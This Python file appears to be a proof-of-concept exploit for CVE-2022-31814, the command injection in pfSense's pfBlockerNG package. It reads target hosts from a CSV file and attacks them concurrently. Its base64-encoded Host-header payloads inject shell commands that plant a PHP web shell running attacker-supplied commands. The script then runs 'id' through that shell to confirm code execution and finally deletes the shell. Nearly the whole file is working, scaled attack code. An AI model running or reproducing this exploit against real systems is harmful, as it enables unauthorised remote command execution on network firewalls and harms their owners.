import asyncio
import csv
import random
import urllib

import httpx

from acetylate_poc.schemas.cli_args import ArgOptionDetails, CommandArgsSchema
from acetylate_poc.utils.manage import GeneralToolsBox
from acetylate_poc.utils.script import build_argparse

TIMEOUT = 7.0

def csv_file_iterator(filename):
    with open(filename, 'r', encoding="utf-8-sig") as file:
        reader = csv.DictReader(file)
        for row in reader:
            yield row

def generate_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Linux; Linux x86_64) AppleWebKit/535.9 (KHTML, like Gecko) Chrome/49.0.1693.366 Safari/600",
        "Mozilla/5.0 (Windows NT 6.2; x64) AppleWebKit/602.37 (KHTML, like Gecko) Chrome/52.0.1753.301 Safari/602",
        "Mozilla/5.0 (Linux i573 ) AppleWebKit/602.30 (KHTML, like Gecko) Chrome/54.0.2062.284 Safari/534",
        "Mozilla/5.0 (Windows; Windows NT 10.1; Win64; x64; en-US) AppleWebKit/601.14 (KHTML, like Gecko) Chrome/51.0.2083.178 Safari/537",  # noqa: E501
        "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/603.14 (KHTML, like Gecko) Chrome/48.0.3669.373 Safari/536",  # noqa: E501
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_2_6; en-US) AppleWebKit/600.41 (KHTML, like Gecko) Chrome/51.0.1016.205 Safari/602",  # noqa: E501
        "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/601.33 (KHTML, like Gecko) Chrome/53.0.3761.294 Safari/533",  # noqa: E501
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_6; en-US) AppleWebKit/536.32 (KHTML, like Gecko) Chrome/51.0.2438.381 Safari/535",  # noqa: E501
        "Mozilla/5.0 (Linux; Linux i686 x86_64) AppleWebKit/537.42 (KHTML, like Gecko) Chrome/48.0.2998.111 Safari/533",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_2_8) AppleWebKit/600.9 (KHTML, like Gecko) Chrome/48.0.1329.307 Safari/534"  # noqa: E501
    ]
    return random.choice(user_agents)  # noqa: S311

async def exploit(client: httpx.AsyncClient, target):
    host = target.get("host")
    protocol = target.get("protocol")
    ip = target.get("ip")
    port = target.get("port")

    payloads = [
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python2 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python2 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3.8 -m base64 -d | php; '"}  # noqa: E501
    ]

    

    up_url = GeneralToolsBox.fix_url(host, protocol, ip, port, "/pfblockerng/www/index.php")
    cmd_url = GeneralToolsBox.fix_url(host, protocol, ip, port, "/system_advanced_control.php?c=id")

    rm_cmd = "rm /usr/local/www/system_advanced_control.php"
    rm_url = GeneralToolsBox.fix_url(
        host, protocol, ip, port,
        f"/system_advanced_control.php?c={urllib.parse.quote(rm_cmd, safe='')}"
    )

    result = None
    try:
        for payload in payloads:
            await asyncio.sleep(0.7)
            payload["User-Agent"] = generate_random_user_agent()
            response = await client.post(up_url, headers=payload, timeout=TIMEOUT)
            if response.status_code == 200:
                break

        response = await client.post(cmd_url, headers=payload, timeout=TIMEOUT)
        response.raise_for_status()
        if "uid" in response.text:
            result = f"[+] [{response.status_code}]\t[{host}]\n{response.text}\n"
        else:
            result = f"[-] [{response.status_code}]\t[{host}]\n{response.text}\n"
    except httpx.HTTPStatusError as exc:
        result = f"[-] [{exc.response.status_code}]\t[{host}] {exc}"
    except httpx.TimeoutException:
        result = f"[-] [Timeout]\t[{host}] Request timed out."
    except httpx.NetworkError as exc:
        result = f"[-] [Network Error]\t[{host}] {exc}"
    except Exception as exc:
        result = f"[-] [Error]\t[{host}] {exc}"
    finally:
        response = await client.post(rm_url, headers=payload, timeout=TIMEOUT)
        return result  # noqa: B012


async def request_task(task_name, queue):
    async with httpx.AsyncClient(verify=False) as client:  # noqa: S501
        while True:
            target = await queue.get()
            if target:
                result = await exploit(client, target)
                print(f"[{task_name}] {result}")
            queue.task_done()

@GeneralToolsBox.timeit
async def main(csv_file, queue_size=300, task_num=7):
    queue = asyncio.Queue(queue_size)

    tasks = []
    zfill_length = len(str(task_num))
    for i in range(task_num):
        task = asyncio.create_task(request_task(f'task-{i:0{zfill_length}d}', queue))
        tasks.append(task)

    for target in csv_file_iterator(csv_file):
        queue.put_nowait(target)

        if queue.full():
            await queue.join()

    if not queue.empty():
        await queue.join()

    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == '__main__':

    args = build_argparse(CommandArgsSchema(
        description=(
            "CVE-2022-31814"
        ),
        required=["file"],
        options={
            "file": ArgOptionDetails(
                short_name="f",
                arg_type="str",
                arg_help="csv file"
            )
        }
    )).parse_args(["--help"])
    if args.file:
        asyncio.run(main(args.file))